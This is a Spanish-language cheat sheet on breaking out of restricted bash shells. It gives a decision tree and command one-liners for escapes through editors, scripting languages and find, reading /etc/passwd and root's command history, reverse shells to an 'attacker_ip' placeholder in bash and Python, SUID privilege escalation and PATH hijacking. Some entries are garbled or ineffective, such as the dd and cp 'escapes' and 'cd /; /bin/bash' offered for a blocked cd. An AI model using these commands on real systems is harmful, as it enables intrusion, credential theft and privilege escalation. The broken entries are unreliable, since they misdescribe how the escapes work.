# Guía completa de escape de Bash Jail

## Árbol de decisión de escape

```
Shell restringida (rbash/rksh)
├── ¿Se puede usar cd?
│   ├── Sí → cd /; sh para cambiar a una shell completa
│   └── No → buscar editores/otros comandos
├── ¿Se pueden usar comillas/escapes?
│   ├── Sí → `whoami` o $(whoami)
│   └── No → buscar otra forma de ejecutar comandos
├── ¿Se pueden acceder a archivos especiales?
│   ├── /dev/tcp → reverse shell
│   ├── /proc → leer archivos sensibles
│   └── ¿Se puede leer HISTFILE? → leer el historial de comandos
└── ¿Hay una lista blanca de comandos?
    ├── vi/vim → escape con :!/bin/sh
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → ejecución directa de comandos
```

## Técnicas de escape

### 1. Escape mediante editores
```bash
vi/vim: :!/bin/sh  o  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. Escape mediante lenguajes de programación
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. Escape mediante operaciones de archivo
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. Descriptores de archivo especiales
```bash
# Leer /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. Leer el historial de comandos
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. Reverse Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Limitaciones específicas de rbash

| Limitación | Método de evasión |
|------|---------|
| No se puede usar cd | `cd /; /bin/bash` |
| No se puede usar / | Usar rutas relativas o comandos internos |
| No se puede usar $() | Comillas invertidas `` `$var` `` |
| No se pueden usar variables de entorno | Heredar el entorno del proceso padre |
| No se puede redirigir | Escribir archivo mediante `/dev/null` |

## Escalada de privilegios explotando SUID

```bash
# Buscar archivos SUID
find / -perm -4000 2>/dev/null

# Binarios SUID comúnmente usados para escalar privilegios
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## Explotación de la variable PATH

```bash
# Si es posible establecer PATH
export PATH=/tmp:$PATH
# Colocar un programa malicioso en /tmp
```
